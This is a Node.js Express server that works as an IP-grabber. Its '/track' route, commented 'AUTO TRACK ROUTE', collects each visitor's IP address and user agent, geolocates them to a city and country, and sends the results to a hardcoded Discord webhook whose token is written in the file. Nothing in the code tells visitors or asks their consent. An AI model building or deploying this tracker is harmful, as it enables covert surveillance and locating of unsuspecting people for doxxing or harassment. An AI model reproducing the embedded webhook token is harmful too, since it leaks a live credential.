import express from "express";
import fetch from "node-fetch";

const app = express();
const PORT = process.env.PORT || 3000;

const WEBHOOK_URL = "https://discord.com/api/webhooks/1511274000641167400/K-dYT4j9-0dWuvQJ4yKMLR7PWiTEXQ7FpXQSxoFN8pEtER5yyVHpGxvPb0SLkEy4uqMO";

app.get("/", (req, res) => {
    res.sendFile("index.html", { root: process.cwd() });
});

// AUTO TRACK ROUTE
app.get("/track", async (req, res) => {

    const ip =
        req.headers["x-forwarded-for"] ||
        req.socket.remoteAddress;

    const userAgent = req.headers["user-agent"];

    let city = "Unknown";
    let country = "Unknown";

    try {
        const geo = await fetch(`https://ipapi.co/${ip}/json/`);
        const data = await geo.json();

        city = data.city || "Unknown";
        country = data.country_name || "Unknown";
    } catch (e) {}

    // Send to Discord
    await fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            content:
`🇵🇭 New Visitor Logged
🌍 IP: ${ip}
📍 Location: ${city}, ${country}
🖥️ Device: ${userAgent}`
        })
    });

    res.sendStatus(200);
});

app.listen(PORT, () => {
    console.log("Server running on " + PORT);
});